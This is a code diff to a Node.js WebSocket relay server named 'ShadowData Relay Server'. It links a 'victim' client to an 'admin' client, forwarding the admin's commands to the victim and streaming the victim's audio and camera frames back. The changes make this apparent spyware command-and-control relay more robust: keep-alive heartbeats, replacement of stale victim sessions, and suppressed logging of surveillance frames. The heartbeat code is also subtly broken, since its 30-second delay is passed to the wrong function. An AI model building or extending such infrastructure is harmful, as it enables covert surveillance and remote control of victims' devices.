@@ -13,14 +13,32 @@ app.get('/', (req, res) => {
     res.send(`ShadowData Relay Server Active.<br>Victim Connected: ${!!victimSocket}<br>Admin Connected: ${!!adminSocket}`);
 });
 
+// Heartbeat interval to keep Render WebSocket connections alive
+const interval = setInterval(() => {
+    wss.clients.forEach((ws) => {
+        if (ws.isAlive === false) return ws.terminate();
+        ws.isAlive = false;
+        ws.ping();
+    }, 30000);
+});
+
 wss.on('connection', (ws, req) => {
+    ws.isAlive = true;
+    ws.on('pong', () => { ws.isAlive = true; });
+
     const urlParams = new URLSearchParams(req.url.split('?')[1]);
     const role = urlParams.get('role');
 
     if (role === 'victim') {
+        if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
+            victimSocket.terminate(); // Terminate previous stale victim connection if any
+        }
         victimSocket = ws;
         console.log('>>> Victim connected successfully.');
     } else if (role === 'admin') {
+        if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
+            adminSocket.terminate(); // Terminate previous stale admin connection if any
+        }
         adminSocket = ws;
         console.log('>>> Admin connected successfully.');
     }
@@ -28,12 +46,15 @@ wss.on('connection', (ws, req) => {
     ws.on('message', (message) => {
         const isBinary = Buffer.isBuffer(message);
         const logContent = isBinary ? `[Binary/Frame Buffer: ${message.length} bytes]` : message.toString();
-        console.log(`Received message from [${role}]: ${logContent.substring(0, 100)}...`);
+        
+        // Avoid spamming logs with continuous audio/camera frame chunks
+        if (!logContent.startsWith('AUDIO_FRAME:') && !logContent.startsWith('CAMERA_FRAME:')) {
+            console.log(`Received message from [${role}]: ${logContent.substring(0, 100)}...`);
+        }
 
         if (role === 'admin') {
             if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
                 victimSocket.send(message);
-                console.log('-> Successfully forwarded command to Victim.');
             } else {
                 console.log('-> ROUTING FAILED: Victim socket is null or not OPEN.');
                 if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
@@ -43,9 +64,8 @@ wss.on('connection', (ws, req) => {
         } else if (role === 'victim') {
             if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                 adminSocket.send(message);
-                console.log('-> Successfully forwarded frame/payload to Admin.');
             } else {
-                console.log('-> ROUTING FAILED: Admin socket is null or not OPEN.');
+                // Admin not connected, drop silently to avoid memory buildup
             }
         }
     });
@@ -60,6 +80,14 @@ wss.on('connection', (ws, req) => {
             console.log('XXX Admin disconnected.');
         }
     });
+
+    ws.on('error', (err) => {
+        console.error(`WebSocket error on [${role}]:`, err.message);
+    });
+});
+
+server.on('close', () => {
+    clearInterval(interval);
 });
 
 const PORT = process.env.PORT || 10000;
